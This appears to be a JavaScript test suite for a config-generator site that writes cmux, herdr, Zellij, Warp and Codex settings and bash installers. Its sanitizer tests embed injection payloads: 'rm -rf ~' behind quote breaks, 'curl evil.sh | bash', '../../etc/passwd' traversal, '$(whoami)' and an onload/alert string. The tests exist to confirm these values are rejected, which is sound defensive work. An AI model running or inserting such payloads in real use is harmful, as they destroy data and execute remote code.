    const lines = CM.buildGhosttyLines(CM.sanitizeCmux({ on: true, preset: pr.id }), ccPal);
    const kv = lines.filter(l => l[0] === 'palette');
    return kv.length !== 16 || !lines.some(l => l[0] === 'background') || !lines.some(l => l[0] === 'foreground');
  }).map(pr => pr.id);
  ok(notWritten.length === 0,
    'each example theme writes background, foreground and all 16 palette lines',
    notWritten.join(', '));

  // Against the real installed bundle, when there is one: the named theme file must
  // exist, and the stored palette must equal what the extraction tool derives from it.
  const THEMES_DIR = '/Applications/cmux.app/Contents/Resources/ghostty/themes';
  let bundle = false;
  try { bundle = fs.statSync(THEMES_DIR).isDirectory(); } catch (e) { bundle = false; }
  if (!bundle) {
    console.log('  – skipped: no installed cmux bundle to check theme files against');
  } else {
    const tool = require('./tools/extract-ghostty-themes.js');
    const have = new Set(fs.readdirSync(THEMES_DIR));
    const named = clientPresets.filter(pr => pr.theme);
    const gone = named.filter(pr => !have.has(pr.theme)).map(pr => pr.theme);
    ok(gone.length === 0, 'every named theme exists in the installed cmux bundle', gone.join(', '));

    const drifted = [];
    for (const pr of named) {
      if (!have.has(pr.theme)) continue;
      const derived = tool.toSitePalette(tool.parseTheme(path.join(THEMES_DIR, pr.theme)), pr.theme);
      for (const k of PAL_KEYS) {
        const a = pr.pal[k].join(',');
        const b = derived[k].map(n => Math.max(0, Math.min(255, Math.round(n)))).join(',');
        if (a !== b) { drifted.push(pr.theme + '.' + k + ': stored ' + a + ' vs file ' + b); break; }
      }
    }
    ok(drifted.length === 0,
      'stored palettes still match the theme files they were generated from',
      drifted.slice(0, 3).join('; ') + (drifted.length ? '  — rerun tools/extract-ghostty-themes.js' : ''));
  }

  // The page and its routes.
  r = await call('/cmux');
  ok(r.status === 200 && /id="winBefore"/.test(r.body) && /id="cmuxControls"/.test(r.body),
    '/cmux renders', 'status ' + r.status);
  const cmPayload = Buffer.from(JSON.stringify({
    n: 'T', p: { bg: [46, 52, 64], subtle: [67, 76, 94], accent: [136, 192, 208] },
    cm: { on: true, fontSize: 16, indicatorStyle: 'border' },
  })).toString('base64url');
  r = await call('/cmux-files.txt?c=' + cmPayload);
  ok(r.status === 200 && /font-size = 16/.test(r.body) && /"indicatorStyle": "border"/.test(r.body)
    && /#88c0d0/.test(r.body),
    '/cmux-files.txt shows both files, layered on the palette', 'status ' + r.status);
  r = await call('/apply.sh?c=' + cmPayload);
  ok(r.status === 200 && /shayan-cc-config [(]cmux[)]/.test(r.body) && /Claude Code [+] cmux/.test(r.body),
    'one install command carries both the Claude Code and the cmux halves');

  // The pieces of the page that are easy to break from the server side: an id renamed
  // here is a control that silently stops working in the browser, and the browser
  // harnesses in tools/ are the only other thing that would catch it.
  r = await call('/cmux');
  const cmPage = r.body;
  for (const [needle, label] of [
    ['id="jsonEdit"', 'cmux.json is an editable textarea'],
    ['id="jsonApply"', 'the JSON editor has an Apply button'],
    ['stateFromCmuxJson', 'an edited cmux.json can be read back into the controls'],
    ["'scc_cmux_saved'", 'saved setups have a storage key'],
    ["'Our Community'", 'the Our Community section exists'],
    ['id="themenote"', 'the Ghostty theme box says whether it can be previewed'],
    ['presetByThemeName', 'a typed theme name previews when its palette is known'],
  ]) ok(cmPage.includes(needle), '/cmux: ' + label);
  // Our Community has to render above the community themes: it is the shortest list and
  // the one you came back for.
  // The "which one do you want" block. It carries claims about four tools, so the test
  // that matters is that it names all four and marks the page you are on — a block that
  // silently lost a tool would still look fine.
  const { TOOLS } = require(path.join(ROOT, 'api/_compare.js'));
  ok(cmPage.includes('id="compare"'), '/cmux: has the comparison block');
  for (const t of TOOLS) ok(cmPage.includes('>' + t.name + '\n') || cmPage.includes(t.name),
    '/cmux: comparison covers ' + t.name);
  ok(/class="cmpcard here"/.test(cmPage), '/cmux: the comparison marks the current page');
  // It sits under the preview, which is where the reader is told to look for it.
  ok(cmPage.indexOf('id="pair"') < cmPage.indexOf('id="compare"'),
    '/cmux: the comparison sits below the preview');
  // A wide table must scroll in its own box rather than sending the page sideways.
  ok(cmPage.includes('cmptablewrap'), '/cmux: the comparison table scrolls in its own box');

  // ── /herdr ────────────────────────────────────────────────────────────────
  const hdPage = (await call('/herdr')).body;
  const HD = require(path.join(ROOT, 'api/_herdr.js'));
  ok(hdPage.includes('id="compare"'), '/herdr: has the comparison block');
  ok(/class="cmpcard here"[\s\S]{0,400}herdr/.test(hdPage), '/herdr: comparison marks herdr');
  ok(hdPage.indexOf('id="pair"') < hdPage.indexOf('id="compare"'),
    '/herdr: the comparison sits below the preview');
  ok(hdPage.includes('id="dockgrip"') && hdPage.includes('id="pinbtn"'),
    '/herdr: the preview pins and resizes like the others');
  for (const p of HD.HERDR_PLUGINS) ok(hdPage.includes(p.repo), '/herdr: lists plugin ' + p.repo);
  ok(hdPage.includes('saneHerdr'), '/herdr: sanitizes the payload before rendering it');
  // Ticking a plugin rewrites the install command at the bottom of the page. That was
  // invisible, so the page now prints the exact lines and each card carries its own.
  ok(hdPage.includes('id="pluCmds"') && hdPage.includes('function pluCmd('),
    '/herdr: shows the commands ticking a plugin adds');
  // And they must genuinely be in the installer, not just described.
  const hdWithPlugins = HD.herdrApplyBlock(HD.sanitizeHerdr({ on: true, plugins: ['reviewr'] }));
  ok(/herdr plugin install persiyanov\/herdr-reviewr/.test(hdWithPlugins),
    '/herdr: a ticked plugin really is in the install command');
  ok(!/openclaw\/crabbox/.test(hdWithPlugins),
    '/herdr: an unticked plugin is not');

  // A ?c= link is attacker-controlled and several herdr values land inside style="" and
  // class="". The server sanitizer is the backstop for the FILE; these pin the values it
  // refuses, since a bad one would otherwise be written to a real config.
  const evilHd = HD.sanitizeHerdr({
    on: true,
    theme: 'nord"; rm -rf ~; #',
    accentColor: 'red;background:url(//x)',
    toastPosition: 'bottom-right" onload="alert(1)',
    worktreeDir: '~/x"; curl evil.sh | bash; #',
    prefix: 'ctrl+b" evil',
    sidebarWidth: 1e9,
    plugins: ['reviewr', '../../etc/passwd', 'owner/repo'],
  });
  ok(evilHd.theme === HD.HERDR_DEFAULTS.theme, 'herdr: a bogus theme falls back');
  ok(evilHd.accentColor === HD.HERDR_DEFAULTS.accentColor, 'herdr: a non-hex accent falls back');
  ok(evilHd.toastPosition === HD.HERDR_DEFAULTS.toastPosition, 'herdr: a bogus toast position falls back');
  ok(evilHd.worktreeDir === HD.HERDR_DEFAULTS.worktreeDir, 'herdr: a path with shell metacharacters falls back');
  ok(evilHd.prefix === HD.HERDR_DEFAULTS.prefix, 'herdr: a bogus prefix falls back');
  ok(evilHd.sidebarWidth <= 36, 'herdr: sidebar width is clamped');
  ok(evilHd.plugins.length === 1 && evilHd.plugins[0] === 'reviewr',
    'herdr: only allowlisted plugin ids survive');
  const evilToml = HD.buildHerdrToml(evilHd);
  ok(!/rm -rf|curl |alert\(|url\(/.test(evilToml), 'herdr: none of that reaches the TOML');
  // The generated installer has to be valid bash even from a hostile payload.
  bashCheck('#!/bin/bash\nset -euo pipefail\n' + HD.herdrApplyBlock(evilHd), 'herdr_apply_hostile');
  // herdr documents ~/.config and HERDR_CONFIG_PATH; it never claims XDG support, so
  // writing to $XDG_CONFIG_HOME would miss the file herdr actually reads.
  // The expansion, not the word — the comment above the line explains why XDG is not
  // used, and a bare substring match would flag that explanation as the bug.
  ok(!/\$\{XDG_CONFIG_HOME/.test(HD.herdrApplyBlock(evilHd)),
    'herdr: the installer targets the documented config path');

  // ── /zellij ───────────────────────────────────────────────────────────────
  const zjPage = (await call('/zellij')).body;
  const ZJ = require(path.join(ROOT, 'api/_zellij.js'));
  ok(zjPage.includes('id="compare"'), '/zellij: has the comparison block');
  ok(zjPage.indexOf('id="pair"') < zjPage.indexOf('id="compare"'),
    '/zellij: the comparison sits below the preview');
  ok(zjPage.includes('id="dockgrip"') && zjPage.includes('id="pinbtn"'),
    '/zellij: the preview pins and resizes like the others');
  for (const p of ZJ.ZJ_PLUGINS) ok(zjPage.includes(p.repo), '/zellij: lists plugin ' + p.repo);
  ok(zjPage.includes('saneZj'), '/zellij: sanitizes the payload before rendering it');
  ok(zjPage.includes('id="pluCmds"') && zjPage.includes('function pluCmd('),
    '/zellij: shows the commands ticking a plugin adds');
  // A Zellij plugin is three things — a download, an alias, and (for some) a keybind.
  // All three have to land or the plugin is present but unreachable.
  const zjWithPlugin = ZJ.sanitizeZellij({ on: true, plugins: ['monocle'] });
  const zjKdlP = ZJ.buildZellijKdl(zjWithPlugin);
  const zjShP = ZJ.zellijApplyBlock(zjWithPlugin);
  ok(/releases\/download\/v0\.100\.2\/monocle\.wasm/.test(zjShP),
    '/zellij: a ticked plugin is downloaded at its pinned tag');
  ok(/monocle location="file:~\/\.config\/zellij\/plugins\/monocle\.wasm"/.test(zjKdlP),
    '/zellij: and gets an alias in config.kdl');
  ok(/LaunchOrFocusPlugin "monocle"/.test(zjKdlP),
    '/zellij: and a keybind, so it is actually reachable');
  // The ten built-in aliases must survive: removing them breaks Zellij's own UI.
  for (const builtin of ['tab-bar', 'status-bar', 'session-manager', 'plugin-manager', 'about']) {
    ok(zjKdlP.includes(builtin + ' '), '/zellij: keeps the built-in ' + builtin + ' alias');
  }

  const evilZj = ZJ.sanitizeZellij({
    on: true, theme: 'nord"; rm -rf ~', defaultMode: 'DROP TABLE',
    onForceClose: 'Detach', copyCommand: 'rm -rf ~', scrollBufferSize: -5,
    webServerPort: 99999, defaultShell: '/bin/sh; curl evil|sh',
    plugins: ['monocle', '../../etc/passwd'],
  });
  ok(evilZj.theme === ZJ.ZELLIJ_DEFAULTS.theme, 'zellij: a bogus theme falls back');
  ok(evilZj.defaultMode === 'normal', 'zellij: a bogus mode falls back');
  // This enum is case-sensitive in Zellij, so "Detach" is a hard startup error.
  ok(evilZj.onForceClose === 'detach', 'zellij: on_force_close is forced lowercase');
  ok(evilZj.copyCommand === 'pbcopy', 'zellij: copy_command comes from a fixed list');
  ok(evilZj.webServerPort <= 65535, 'zellij: the port is clamped');
  ok(evilZj.plugins.length === 1, 'zellij: only allowlisted plugin ids survive');
  const evilKdl = ZJ.buildZellijKdl(evilZj);
  ok(!/rm -rf|curl |evil/.test(evilKdl), 'zellij: none of that reaches the KDL');
  bashCheck('#!/bin/bash\nset -euo pipefail\n' + ZJ.zellijApplyBlock(evilZj), 'zellij_apply_hostile');
  // Zellij ignores $XDG_CONFIG_HOME entirely; writing there would miss the file it reads.
  // Asserted positively — the comment above that line in the installer explains the
  // choice and names the variable, so a "does not contain" check would match the prose.
  ok(/ZJ_DIR="\$HOME\/\.config\/zellij"/.test(ZJ.zellijApplyBlock(evilZj)),
    'zellij: the installer targets ~/.config/zellij');
  // The docs' spelling of this key is silently ignored by the binary.
  ok(/serialize_pane_viewport/.test(evilKdl) && !/pane_viewport_serialization/.test(evilKdl),
    'zellij: uses the key name the binary actually reads');
  // rounded_corners only works nested under ui { pane_frames { … } }.
  ok(/ui \{[\s\S]*pane_frames \{[\s\S]*rounded_corners/.test(evilKdl),
    'zellij: rounded_corners is nested where it takes effect');

  // If a real zellij is on PATH, let it be the judge — it is the only thing that can be,
  // since Zellij accepts unknown option keys without complaining.
  const zjBin = cp.spawnSync('zellij', ['--version'], { encoding: 'utf8' });
  if (zjBin.status === 0) {
    const dir = fs.mkdtempSync(path.join(TMP, 'zj-'));
    fs.mkdirSync(path.join(dir, 'layouts'));
    const full = ZJ.sanitizeZellij({ on: true, agentLayout: true, plugins: ZJ.ZJ_PLUGINS.map(p => p.id) });
    fs.writeFileSync(path.join(dir, 'config.kdl'), ZJ.buildZellijKdl(full));
    fs.writeFileSync(path.join(dir, 'layouts', 'ai-agent.kdl'), ZJ.buildAgentLayout(full));
    const chk = cp.spawnSync('zellij', ['--config-dir', dir, 'setup', '--check'], { encoding: 'utf8' });
    const out = (chk.stdout || '') + (chk.stderr || '');
    ok(!/error|invalid|unsupported|not found/i.test(out),
      'zellij: the generated config passes the real binary', out.slice(0, 200));
  } else {
    console.log('  – zellij not on PATH, skipping the real-binary check');
  }

  // ── /warp ─────────────────────────────────────────────────────────────────
  const wpPage = (await call('/warp')).body;
  const WP = require(path.join(ROOT, 'api/_warp.js'));
  ok(wpPage.includes('id="compare"'), '/warp: has the comparison block');
  ok(/class="cmpcard here"[\s\S]{0,400}Warp/.test(wpPage), '/warp: comparison marks Warp');
  ok(wpPage.includes('saneWarp'), '/warp: sanitizes the payload before rendering it');
  // The page has to be explicit that settings.toml is the one file it will not write.
  ok(wpPage.includes('not written by the installer'),
    '/warp: says settings.toml is left alone');

  const wpal = { bg: [26, 27, 38], text: [192, 202, 245], subtle: [48, 52, 70], accent: [122, 162, 247],
    accent2: [187, 154, 247], cyan: [125, 207, 255], green: [158, 206, 106], red: [247, 118, 142],
    yellow: [224, 175, 104], blue: [122, 162, 247] };
  const wpOk = WP.sanitizeWarp({ on: true, themeName: 'My Theme' });
  const wpTheme = WP.buildWarpTheme(wpOk, wpal);
  // Warp needs both ANSI rows filled; a theme with only `normal` renders half-stock.
  for (const k of WP.ANSI) {
    ok(new RegExp('^    ' + k + ': "#[0-9a-f]{6}"$', 'm').test(wpTheme),
      '/warp: theme defines ' + k);
  }
  ok((wpTheme.match(/^  (normal|bright):$/gm) || []).length === 2,
    '/warp: theme has both the normal and bright rows');
  ok(/^name: My Theme$/m.test(wpTheme), '/warp: theme carries its name');
  // The installer must never write settings.toml — that file is Warp's, and it holds
  // agent command allow/deny lists that a font-size change has no business replacing.
  const wpSh = WP.warpApplyBlock(wpOk, wpal);
  ok(!/settings\.toml"?\s*<</.test(wpSh) && !/> *"\$WARP_DIR\/settings\.toml/.test(wpSh),
    '/warp: the installer never writes settings.toml');
  ok(/themes\/My Theme\.yaml/.test(wpSh), '/warp: the installer writes the theme');
  // Tab configs replaced launch configurations, and their pane structs use
  // deny_unknown_fields — an unrecognised key is a hard parse error, not a warning.
  const wpTab = WP.buildWarpTabConfig(wpOk);
  ok(/tab_configs\//.test(wpSh) && !/launch_configurations\//.test(wpSh),
    '/warp: the installer writes a tab config, not the deprecated launch config');
  ok(/^id = "root"$/m.test(wpTab) && /^children = \[/m.test(wpTab),
    '/warp: the tab config has a root split');
  // Each pane gets at most one command: Warp runs them in sequence and an interactive
  // one never returns, so anything after it would silently never run.
  for (const line of wpTab.split('\n').filter(l => l.startsWith('commands = '))) {
    ok((line.match(/","/g) || []).length === 0, '/warp: one command per pane — ' + line.trim());
  }
  // A CUSTOM theme is a table, not a bare string; a bare name is only valid for Warp's
  // own built-ins and would fall back silently.
  const wpSnip = WP.buildWarpSettingsSnippet(wpOk);
  ok(/theme = \{ custom = \{ name = "My Theme", path = "~\/\.warp\/themes\/My Theme\.yaml" \} \}/.test(wpSnip),
    '/warp: a custom theme is referenced as a table with name and path');

  // The strongest check this page can make: validate the snippet against the schema
  // bundled inside the Warp app, which is the contract Warp itself validates against.
  // Warp does not error on an unknown key or a bad enum — it falls back to the default
  // behind a dismissible banner — so nothing else would catch a wrong value.
  const wpSchemaPath = '/Applications/Warp.app/Contents/Resources/settings_schema.json';
  if (fs.existsSync(wpSchemaPath)) {
    const schema = JSON.parse(fs.readFileSync(wpSchemaPath, 'utf8'));
    const defs = schema.$defs || {};
    const deref = n => { while (n && n.$ref) n = defs[n.$ref.split('/').pop()]; return n; };
    const constsOf = n => {
      n = deref(n);
      if (!n) return null;
      if (n.enum) return new Set(n.enum);
      if (n.oneOf) { const c = n.oneOf.filter(o => 'const' in o).map(o => o.const); return c.length ? new Set(c) : null; }
      return null;
    };
    // A deliberately minimal TOML reader: the snippet is ours, so it only has to handle
    // [section] headers and key = value lines.
    const cfg = {};
    let cur = cfg;
    for (const raw of wpSnip.split('\n')) {
      const line = raw.trim();
      if (!line || line.startsWith('#')) continue;
      const sec = /^\[([a-z0-9_.]+)\]$/.exec(line);
      if (sec) { cur = cfg; for (const part of sec[1].split('.')) cur = (cur[part] = cur[part] || {}); continue; }
      const kv = /^([a-z0-9_]+) = (.+)$/.exec(line);
      if (kv) cur[kv[1]] = kv[2];
    }
    const problems = [];
    (function check(node, sch, p) {
      sch = deref(sch);
      const props = (sch && sch.properties) || {};
      for (const [k, v] of Object.entries(node)) {
        const at = p ? p + '.' + k : k;
        if (!(k in props)) { problems.push('unknown key ' + at); continue; }
        const sub = deref(props[k]);
        if (v && typeof v === 'object') { if (sub && sub.properties) check(v, sub, at); continue; }
        const str = /^"(.*)"$/.exec(String(v));
        if (!str) continue;
        const allowed = constsOf(props[k]);
        if (allowed && !allowed.has(str[1])) problems.push(at + ' = "' + str[1] + '"');
      }
    })(cfg, schema, '');
    ok(problems.length === 0,
      '/warp: the settings snippet validates against Warp’s own schema', problems.join('; '));
  } else {
    console.log('  – Warp not installed, skipping the settings-schema check');
  }

  // A hostile payload: the theme name becomes a FILENAME and the agent command is
  // EXECUTED, so both are the interesting ones.
  const wpEvil = WP.sanitizeWarp({
    on: true, themeName: '../../../etc/pwn"; rm -rf ~; #', lcName: 'a/b$(whoami)',
    lcAgentCommand: 'rm -rf ~', background: 'red;x', cursorType: 'nope',
    opacity: 9999, fontSize: -3,
  });
  ok(!/[^A-Za-z0-9 _-]/.test(wpEvil.themeName), '/warp: a theme name is reduced to a safe filename');
  ok(!wpEvil.themeName.includes('..') && !wpEvil.themeName.includes('/'),
    '/warp: a theme name cannot climb out of the themes directory');
  ok(wpEvil.lcAgentCommand === 'zsh', '/warp: the executed command comes from a fixed list (and stock is a plain shell)');
  ok(wpEvil.background === WP.WARP_DEFAULTS.background, '/warp: a bad colour falls back');
  ok(wpEvil.opacity === 100 && wpEvil.fontSize === 8, '/warp: numbers are clamped');
  const wpEvilSh = WP.warpApplyBlock(wpEvil, wpal);
  bashCheck('#!/bin/bash\nset -euo pipefail\n' + wpEvilSh, 'warp_apply_hostile');
  // Whatever words survive the character filter land inside double quotes or a quoted
  // heredoc, so they cannot execute. The property to pin is that no shell metacharacter
  // reaches the script FROM THE PAYLOAD — the installer's own $(date …) for the backup
  // stamp is legitimate, so a blanket ban on substitution would flag the wrong thing.
  for (const [field, v] of Object.entries(wpEvil)) {
    if (typeof v !== 'string') continue;
    ok(!/[$`"'\\;|&<>()]/.test(v), '/warp: no shell metacharacter survives in ' + field);
  }

  // Naming a saved setup must not go through prompt(): the browser counts every second
  // that a modal is open as time the click handler blocked the main thread, so naming one
  // at human speed reported a ~6s interaction and Chrome flagged the page for it.
  // Comment lines dropped first, or the note above the fix matches its own description.
  const cmCode = extractScripts(cmPage).join('\n')
    .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
  ok(!/[^.\w]prompt\s*\(/.test(cmCode), '/cmux: saving does not open a blocking prompt()');
  ok(cmCode.includes("'oursName'") && cmCode.includes("'saveinput'"),
    '/cmux: a setup is named in an inline field instead');
  // An <input> inside a <button> is invalid HTML and will not reliably focus.
  ok(/saveCard[\s\S]{0,300}createElement\('div'\)/.test(cmPage),
    '/cmux: the save card is a div, so it can hold that field');

  // Regex written inside a template literal loses a single backslash on the way to the
  // browser, so \\s must be doubled in the source. This one shipped as a literal "s".
  ok(!/replace\(\/\^JSON\.parse:\?s\*/.test(cmPage),
    '/cmux: the JSON error cleanup keeps its whitespace class');

  ok(cmPage.indexOf("'Our Community'") > 0
    && cmPage.indexOf("'Our Community'") < cmPage.indexOf("'Popular in the community'"),
    '/cmux: Our Community is ordered above Popular in the community');

  // ── the Codex CLI layer ────────────────────────────────────────
  // /codex merges a [tui] table into ~/.codex/config.toml — a file that also holds the
  // user's model, MCP servers and plugins. The contract mirrors the cmux layer: parse
  // first and abort if the file doesn't parse, back up, rebuild only [tui] keeping its
  // unmanaged keys, validate before writing, idempotent.
  console.log('— codex —');
  const CX = require('./api/_codex.js');

  // The sanitizer against a hostile payload: every field is enum-or-boolean, so a
  // stranger's link can pick from known lists and nothing else.
  const cxEvil = CX.sanitizeCodex({
    on: true,
    theme: '"; rm -rf ~ #',
    statusLine: ['model', 'model', '../etc', 'git-branch', { x: 1 }],
    terminalTitle: 'not-an-array',
    pet: 'custom-<script>',
    petAnchor: 'yolo',
    slColors: 'yes',
    animations: 1,
    pickerView: 'gigantic',
  });
  ok(cxEvil.theme === '', 'codex: a hostile theme name falls back to adaptive');
  ok(JSON.stringify(cxEvil.statusLine) === '["model","git-branch"]',
    'codex: status line keeps only known ids, deduped, in order', JSON.stringify(cxEvil.statusLine));
  ok(JSON.stringify(cxEvil.terminalTitle) === JSON.stringify(CX.CODEX_DEFAULTS.terminalTitle),
    'codex: a non-array terminal title falls back to stock');
  ok(cxEvil.pet === '' && cxEvil.petAnchor === 'composer' && cxEvil.slColors === true
    && cxEvil.animations === true && cxEvil.pickerView === 'dense',
    'codex: hostile enums and non-booleans all fall back');
  ok(CX.sanitizeCodex({ on: false }) === null && CX.sanitizeCodex(null) === null,
    'codex: off or absent yields no layer');

  // The generated lines: '' theme and '' pet emit no line at all (adaptive / no pet),
  // and every emitted line parses as TOML.
  const cxOff = CX.sanitizeCodex({ on: true });
  const cxOffLines = CX.buildCodexTomlLines(cxOff).map(kv => kv[0]);
  ok(!cxOffLines.includes('theme') && !cxOffLines.includes('pet'),
    'codex: adaptive theme and no-pet emit no line', cxOffLines.join(','));
  const cxOn = CX.sanitizeCodex({ on: true, theme: 'dracula', pet: 'dewey' });
  const cxOnLines = CX.buildCodexTomlLines(cxOn).map(kv => kv[0]);
  ok(cxOnLines.includes('theme') && cxOnLines.includes('pet') && cxOnLines.includes('pet_anchor'),
    'codex: a chosen theme and pet do emit lines');
  ok(cxOnLines.every(k => CX.MANAGED_KEYS.includes(k)),
    'codex: every emitted key is in the managed set (the merge can always remove it)');

  // The merge against a lived-in config.toml: comments, an existing [tui] with keys we
  // do not manage (an inline table among them), a [tui.notifications] subsection, and
  // MCP servers that must survive byte-for-byte.
  const cxHome = path.join(TMP, 'codexhome');
  fs.mkdirSync(path.join(cxHome, '.codex'), { recursive: true });
  const cxCfg = path.join(cxHome, '.codex', 'config.toml');
  fs.writeFileSync(cxCfg, [
    '# precious comment', 'model = "gpt-5.6-sol"', '',
    '[tui]', 'theme = "zenburn"', 'unmanaged_key = 7',
    'inline_thing = { style = "compact", n = 2 }', '',
    // notifications is a MANAGED key: a stale [tui.notifications] table (which codex
    // itself cannot deserialize) must be swept and replaced by the managed bool.
    '[tui.notifications]', 'notifications = true', '',
    // keymap is NOT managed, and only a DEEP header exists — the rebuild must leave
    // it in place, not re-serialize the parent inline (that declared the table twice).
    '[tui.keymap.global]', 'open_transcript = "ctrl-s"', '',
    '[mcp_servers.foo]', 'url = "https://x"', ''].join('\n'));
  const cxFile = path.join(TMP, 'codex.sh');
  fs.writeFileSync(cxFile, '#!/bin/bash\nset -euo pipefail\n' + CX.codexApplyBlock(cxOn) + '\n');
  ok(cp.spawnSync('bash', ['-n', cxFile], { encoding: 'utf8' }).status === 0, 'bash -n: codex layer');
  const cxRun = bash(cxFile, cxHome);
  ok(cxRun.status === 0, 'codex layer applies cleanly', (cxRun.stderr || '').trim().slice(0, 120));
  const cxAfterText = fs.readFileSync(cxCfg, 'utf8');
  ok(cxAfterText.includes('# precious comment'), 'codex: comments outside [tui] survive');
  ok(fs.readdirSync(path.dirname(cxCfg)).some(f => /config[.]toml[.]backup-/.test(f)),
    'codex: the old config is backed up first');
  // node has no TOML parser; python3 (already required by the layer) verifies shape.
  const cxCheck = cp.spawnSync('python3', ['-c', [
    'import tomllib,json,sys',
    `d = tomllib.load(open(${JSON.stringify(cxCfg)}, "rb"))`,
    'print(json.dumps([d["model"], d["tui"]["theme"], d["tui"]["unmanaged_key"],',
    '  d["tui"]["inline_thing"]["n"], d["tui"]["notifications"],',
    '  d["tui"]["keymap"]["global"]["open_transcript"],',
    '  d["mcp_servers"]["foo"]["url"], d["tui"]["pet"]]))'].join('\n')], { encoding: 'utf8' });
  ok(cxCheck.status === 0
    && cxCheck.stdout.trim() === '["gpt-5.6-sol", "dracula", 7, 2, true, "ctrl-s", "https://x", "dewey"]',
    'codex: managed keys (and their stale subsections) replaced; unmanaged keys, deep keymap sections and MCP servers survive',
    cxCheck.stdout.trim() || (cxCheck.stderr || '').slice(0, 160));
  // Idempotent: a second run must not change a byte.
  const cxSnap = fs.readFileSync(cxCfg, 'utf8');
  ok(bash(cxFile, cxHome).status === 0 && fs.readFileSync(cxCfg, 'utf8') === cxSnap,
    'codex: rerunning changes nothing');
  // Turning the pet off must REMOVE the key a previous run wrote, not leave it stale.
  const cxNoPet = path.join(TMP, 'codex-nopet.sh');
  fs.writeFileSync(cxNoPet, '#!/bin/bash\nset -euo pipefail\n' + CX.codexApplyBlock(cxOff) + '\n');
  ok(bash(cxNoPet, cxHome).status === 0
    && !/^pet /m.test(fs.readFileSync(cxCfg, 'utf8')) && !/^theme /m.test(fs.readFileSync(cxCfg, 'utf8')),
    'codex: turning the pet and theme off removes the keys a previous run wrote');
  // An unparseable config.toml aborts rather than guessing.
  const cxBad = path.join(TMP, 'codexbad');
  fs.mkdirSync(path.join(cxBad, '.codex'), { recursive: true });
  fs.writeFileSync(path.join(cxBad, '.codex', 'config.toml'), '[broken\nmodel = ');
  const cxBadRun = bash(cxFile, cxBad);
  ok(cxBadRun.status === 1, 'codex: an unparseable config.toml aborts rather than guessing',
    'exit ' + cxBadRun.status);
  ok(fs.readFileSync(path.join(cxBad, '.codex', 'config.toml'), 'utf8') === '[broken\nmodel = ',
    'codex: the unparseable file is left byte-identical');
  // A machine with no ~/.codex at all.
  const cxNew = path.join(TMP, 'codexnew');
  fs.mkdirSync(cxNew, { recursive: true });
  ok(bash(cxFile, cxNew).status === 0
    && fs.readFileSync(path.join(cxNew, '.codex', 'config.toml'), 'utf8').includes('[tui]'),
    'codex: works on a machine with no config yet');
  // macOS's own /usr/bin/python3 is 3.9 — no tomllib. The block must go LOOKING for a
  // capable python (the E2E on a stripped PATH found this the hard way: the layer
  // "skipped" and still printed the success hint), and when none exists it must say
  // nothing was changed rather than reading like success.
  const cxBlockText = fs.readFileSync(cxFile, 'utf8');
  ok(/for CODEX_CAND in python3 .*python3\.11/.test(cxBlockText)
    && cxBlockText.includes("-c 'import tomllib'")
    && cxBlockText.includes('/opt/homebrew/bin/python3'),
    'codex: the installer hunts for a tomllib-capable python, not just any python3');
  ok(cxBlockText.includes('Nothing was changed. Install one and rerun'),
    'codex: no capable python reads as a skip, not a success');
  ok(cxBlockText.indexOf('import tomllib\npath, managed_path') > 0,
    'codex: the python script assumes tomllib — capability is decided in shell, so its exit 0 means merged');

  // ── regression fixes: the adversarial review's confirmed merge bugs ──────────
  // All five were reproduced against the first merge, which detected section headers
  // with a line regex. A line that LOOKS like [tui] can sit inside a multi-line string
  // or array, where it is data; the fix asks tomllib whether the file-prefix up to a
  // candidate parses as complete TOML, and refuses [[tui]] outright.
  const cxRT = (name, content, expectStatus) => {
    const home = path.join(TMP, 'codexrt-' + name);
    fs.mkdirSync(path.join(home, '.codex'), { recursive: true });
    const f = path.join(home, '.codex', 'config.toml');
    fs.writeFileSync(f, content);
    const run = bash(cxFile, home);
    return { home, f, run, after: fs.readFileSync(f, 'utf8') };
  };
  const py = (code) => cp.spawnSync('python3', ['-c', code], { encoding: 'utf8' });

  // 1. a fake [tui.keep]-looking line inside a multi-line string must not delete the
  //    real dotted-key subtable or hijack the boundary.
  let rt = cxRT('fakehdr', [
    '[tui]', 'keep = { a = 1 }',
    'note = """', 'this mentions', '[tui.keep]', 'inside a string', '"""', '',
    '[features]', 'x = 1', ''].join('\n'));
  let chk = py(`import tomllib,json
d = tomllib.load(open(${JSON.stringify(rt.f)}, 'rb'))
print(json.dumps([d['tui']['keep']['a'], '[tui.keep]' in d['tui']['note'], d['features']['x'], d['tui']['theme']]))`);
  ok(rt.run.status === 0 && chk.stdout.trim() === '[1, true, 1, "dracula"]',
    'codex: a [tui.x]-looking line inside a string is data, not a boundary',
    chk.stdout.trim() || (rt.run.stderr || '').slice(0, 120));

  // 2. a fake [tui] line inside a multi-line string elsewhere must not start a section.
  rt = cxRT('fakestart', [
    'banner = """', '[tui]', 'is mentioned here', '"""',
    'model = "keep-me"', ''].join('\n'));
  chk = py(`import tomllib,json
d = tomllib.load(open(${JSON.stringify(rt.f)}, 'rb'))
print(json.dumps([d['model'], '[tui]' in d['banner'], d['tui']['pet']]))`);
  ok(rt.run.status === 0 && chk.stdout.trim() === '["keep-me", true, "dewey"]',
    'codex: a [tui]-looking line inside a string does not hijack the splice',
    chk.stdout.trim() || (rt.run.stderr || '').slice(0, 120));

  // 3. multi-line values under [tui] survive.
  rt = cxRT('multiline', [
    '[tui]', 'notes = """', 'line one', 'line two', '"""',
    'extra = [', '  "a",', '  "b",', ']', ''].join('\n'));
  chk = py(`import tomllib,json
d = tomllib.load(open(${JSON.stringify(rt.f)}, 'rb'))
print(json.dumps([d['tui']['notes'].strip().split('\\n')[0], d['tui']['extra'], d['tui']['theme']]))`);
  ok(rt.run.status === 0 && chk.stdout.trim() === '["line one", ["a", "b"], "dracula"]',
    'codex: multi-line strings and arrays under [tui] survive the rebuild',
    chk.stdout.trim() || (rt.run.stderr || '').slice(0, 120));

  // 4. [[tui]] array-of-tables refuses politely instead of crashing.
  rt = cxRT('aot', '[[tui]]\ntheme = "zenburn"\n');
  ok(rt.run.status === 1 && /array of tables/.test(rt.run.stdout)
    && rt.after === '[[tui]]\ntheme = "zenburn"\n',
    'codex: [[tui]] aborts with a message and the file untouched',
    'exit ' + rt.run.status);

  // 5. a CRLF file stays CRLF, untouched sections included.
  rt = cxRT('crlf', '# top\r\nmodel = "keep"\r\n\r\n[features]\r\nx = 1\r\n');
  ok(rt.run.status === 0 && /# top\r\n/.test(rt.after) && /x = 1\r\n/.test(rt.after)
    && /theme = "dracula"\r\n/.test(rt.after),
    'codex: a CRLF config keeps its line endings through the merge');

